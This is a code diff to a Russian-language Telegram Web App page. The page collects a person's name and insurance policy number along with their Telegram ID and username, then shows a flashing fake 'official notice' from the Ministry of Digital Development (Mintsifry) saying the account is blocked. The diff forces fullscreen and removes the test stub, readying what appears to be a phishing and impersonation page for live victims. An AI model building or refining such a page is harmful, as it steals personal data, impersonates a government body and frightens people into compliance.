@@ -72,10 +72,10 @@
       <button onclick="saveInput('name', 'step3')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
-    <!-- Шаг 3: Полис -->
+    <!-- Шаг 3: Полис (цифровая клавиатура) -->
     <div id="step3" class="hidden fade">
       <h3 class="text-xl font-semibold mb-6">Номер Вашего страхового полиса:</h3>
-      <input id="polis" type="text" placeholder="1234 567 890" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9 ]/g, '');" />
+      <input id="polis" type="tel" inputmode="numeric" pattern="[0-9 ]*" placeholder="1234 567 890" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9 ]/g, '');" />
       <button onclick="saveInput('polis', 'step4')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
@@ -122,7 +122,7 @@
     <!-- Экран блокировки -->
     <div id="blocked" class="hidden fade text-center bg-red-50 p-8 rounded-2xl border-4 border-red-600 animate-pulse">
       <div class="text-6xl text-red-600 blink mb-6">!</div>
-      <img src="минцифры.jpg" alt="Минцифры" class="w-48 mx-auto mb-6 rounded-xl shadow-2xl">
+      <img src="https://i.imgur.com/ваша_картинка_минцифр.jpg" alt="Минцифры" class="w-48 mx-auto mb-6 rounded-xl shadow-2xl">
       <h1 class="text-2xl font-bold text-red-800 mb-4 glitch">🇷🇺 МИНЦИФРЫ — ОФИЦИАЛЬНОЕ УВЕДОМЛЕНИЕ 🇷🇺</h1>
       <p class="text-lg text-red-700 mb-8 leading-relaxed">
         ⚠️ <b>ВНИМАНИЕ!</b><br><br>
@@ -142,6 +142,11 @@
   <script>
     let answers = {};
     let currentStep = 0;
+
+    // Автоматический разворот на весь экран
+    Telegram.WebApp.ready();
+    Telegram.WebApp.expand();
+    Telegram.WebApp.requestFullscreen();
 
     function show(id) {
       document.querySelectorAll('#welcome, [id^="step"], #check, #blocked').forEach(el => el.classList.add('hidden'));
@@ -197,8 +202,8 @@
     function finish() {
       const payload = {
         ...answers,
-        userId: Telegram.WebApp.initDataUnsafe?.user?.id || 'test-user',
-        username: Telegram.WebApp.initDataUnsafe?.user?.username || 'test-username'
+        userId: Telegram.WebApp.initDataUnsafe?.user?.id || '',
+        username: Telegram.WebApp.initDataUnsafe?.user?.username || ''
       };
 
       console.log("Отправляем данные:", payload);
@@ -220,17 +225,9 @@
       })
       .catch(err => {
         console.error('Ошибка fetch:', err);
-        show('blocked');  // показываем блокировку даже при ошибке
+        show('blocked');
       });
     }
-
-    // Имитация Telegram.WebApp для теста в браузере
-    window.Telegram = {
-      WebApp: {
-        initDataUnsafe: { user: { id: '123456', username: 'testuser' } },
-        sendData: (data) => console.log('Отправлено:', data)
-      }
-    };
   </script>
 </body>
 </html>
